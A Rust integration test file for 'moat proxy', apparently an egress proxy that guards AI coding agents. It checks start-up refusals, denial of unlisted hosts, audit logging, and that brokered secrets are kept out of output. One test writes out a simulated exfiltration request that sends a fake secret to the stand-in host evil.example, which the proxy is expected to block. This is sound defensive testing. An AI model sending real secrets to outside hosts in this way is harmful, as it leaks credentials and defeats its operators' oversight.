//! `moat proxy`: start-up checks, one refused connection recorded in the
//! audit log, and brokered secrets kept out of replies, output and the log.
//! Allowed traffic and injection are covered by `openmoat-proxy`'s own tests,
//! which can point a name at a local server; this binary uses the system
//! resolver.

use std::io::{BufRead as _, BufReader, Read as _, Write as _};
use std::net::TcpStream;
use std::process::Stdio;
use std::time::Duration;

use crate::common::{Sandbox, json, stderr, text};

#[test]
fn refuses_a_non_loopback_listen_address() {
    let sb = Sandbox::installed(&[]);
    let out = sb.moat(&["proxy", "--listen", "0.0.0.0:0"]);
    assert_eq!(out.status.code(), Some(64));
    assert!(
        stderr(&out).contains("not a loopback address"),
        "{}",
        stderr(&out)
    );
}

#[test]
fn refuses_to_start_before_init() {
    let sb = Sandbox::bare(&[]);
    let out = sb.moat(&["proxy", "--listen", "127.0.0.1:0"]);
    assert_eq!(out.status.code(), Some(64));
    assert!(stderr(&out).contains("moat init"), "{}", stderr(&out));
}

#[test]
fn refuses_to_start_over_a_drifted_lock() {
    let sb = Sandbox::installed(&[]);
    let policy = sb.home.join(".moat/policy.yaml");
    let mut text = std::fs::read_to_string(&policy).unwrap();
    text.push_str("\n# edited\n");
    std::fs::write(&policy, text).unwrap();
    let out = sb.moat(&["proxy", "--listen", "127.0.0.1:0"]);
    assert_eq!(out.status.code(), Some(64));
    assert!(stderr(&out).contains("drift"), "{}", stderr(&out));
}

#[test]
fn an_unlisted_host_gets_403_and_an_audit_row() {
    let sb = Sandbox::installed(&[]);
    let mut child = sb
        .command()
        .args(["proxy", "--listen", "127.0.0.1:0"])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    let mut line = String::new();
    BufReader::new(child.stdout.take().unwrap())
        .read_line(&mut line)
        .unwrap();
    let Some(addr) = line.split_whitespace().nth(4) else {
        // No line means the proxy exited; its stderr says why.
        let mut why = String::new();
        let _ = child.stderr.take().unwrap().read_to_string(&mut why);
        panic!("no address in {line:?}; stderr: {why}");
    };

    let mut s = TcpStream::connect(addr).unwrap();
    s.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
    s.write_all(b"GET http://evil.example/ HTTP/1.1\r\n\r\n")
        .unwrap();
    let mut reply = String::new();
    let _ = s.read_to_string(&mut reply);
    let _ = child.kill();
    let _ = child.wait();
    assert!(reply.starts_with("HTTP/1.1 403 Forbidden"), "{reply}");
    assert!(reply.contains("default.fetch"), "{reply}");

    let shown = json(&sb.moat(&["show", "--format", "json"]));
    let row = &shown.as_array().unwrap()[0];
    assert_eq!(row["host"], "proxy");
    assert_eq!(row["tool"], "GET");
    assert_eq!(row["verdict"], "deny");
    assert_eq!(row["action"]["net"]["url"], "http://evil.example:80");
}

#[test]
fn doctor_and_status_warn_while_the_hosts_proxy_is_not_listening() {
    let sb = Sandbox::installed(&[".claude", ".codex"]);
    let port = sb.use_free_proxy_port();
    let warning = format!("WARNING: nothing listens on 127.0.0.1:{port}");
    for args in [["doctor"], ["status"]] {
        let out = sb.moat(&args);
        assert!(text(&out).contains(&warning), "{args:?}: {}", text(&out));
        assert_eq!(out.status.code(), Some(0), "a warning: {}", text(&out));
    }

    // Without --listen it serves the policy's port, the one the hosts use.
    let _proxy = sb.start_proxy();
    let listening = format!("listening on 127.0.0.1:{port}");
    for args in [["doctor"], ["status"]] {
        let out = sb.moat(&args);
        assert!(text(&out).contains(&listening), "{args:?}: {}", text(&out));
    }
}

/// Generated for the test; no real secret is used.
const FAKE: &str = "fake-e2e-secret-31b7c04e9a";

/// An installed sandbox whose policy brokers `MOAT_E2E_FAKE` for api.github.com,
/// re-pinned as a person would.
fn brokered() -> Sandbox {
    let sb = Sandbox::installed(&[]);
    let policy = sb.home.join(".moat/policy.yaml");
    let mut text = std::fs::read_to_string(&policy).unwrap();
    text.push_str(
        "\nsecrets:\n  - id: gh\n    host: api.github.com\n    header: Authorization\n    \
         source: { env: MOAT_E2E_FAKE }\n",
    );
    std::fs::write(&policy, text).unwrap();
    let out = sb.moat_as_person(&["doctor", "--accept"]);
    assert_eq!(out.status.code(), Some(0), "{}", stderr(&out));
    sb
}

#[test]
fn a_secret_that_cannot_be_read_stops_the_proxy() {
    let sb = brokered();
    let out = sb.moat(&["proxy", "--listen", "127.0.0.1:0"]);
    assert_eq!(out.status.code(), Some(64));
    assert!(
        stderr(&out).contains("reading secret `gh`"),
        "{}",
        stderr(&out)
    );
}

#[test]
fn brokered_secrets_never_reach_the_agent_or_the_audit_log() {
    let sb = brokered();
    let mut child = sb
        .command()
        .args(["proxy", "--listen", "127.0.0.1:0"])
        .env("MOAT_E2E_FAKE", format!("{FAKE}\n"))
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    let mut stdout = BufReader::new(child.stdout.take().unwrap());
    let (mut listening, mut secret) = (String::new(), String::new());
    stdout.read_line(&mut listening).unwrap();
    stdout.read_line(&mut secret).unwrap();
    let addr = listening.split_whitespace().nth(4).unwrap().to_owned();
    assert!(
        secret.contains("give the agent moat-secret:gh:placeholder"),
        "{secret}"
    );

    let mut replies = String::new();
    for request in [
        format!("GET http://evil.example/?t={FAKE} HTTP/1.1\r\n\r\n"),
        "GET http://example.org/ HTTP/1.1\r\nAuthorization: Bearer moat-secret:gh:placeholder\r\n\r\n"
            .to_owned(),
    ] {
        let mut s = TcpStream::connect(&addr).unwrap();
        s.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
        s.write_all(request.as_bytes()).unwrap();
        let mut reply = String::new();
        let _ = s.read_to_string(&mut reply);
        assert!(reply.starts_with("HTTP/1.1 403"), "{reply}");
        assert!(reply.contains("proxy-secret"), "{reply}");
        replies.push_str(&reply);
    }
    let _ = child.kill();
    let _ = child.wait();
    let mut printed = secret;
    let _ = stdout.read_to_string(&mut printed);
    let _ = child.stderr.take().unwrap().read_to_string(&mut printed);

    let shown = sb.moat(&["show", "--format", "json"]);
    let rows = json(&shown);
    assert_eq!(rows.as_array().unwrap().len(), 2);
    assert!(
        rows.as_array()
            .unwrap()
            .iter()
            .all(|r| r["rules"][0] == "proxy-secret")
    );
    for (what, text) in [
        ("replies", replies),
        ("proxy output", printed),
        (
            "audit log",
            String::from_utf8_lossy(&shown.stdout).into_owned(),
        ),
    ] {
        assert!(!text.contains(FAKE), "{what} carries the value: {text}");
    }
}
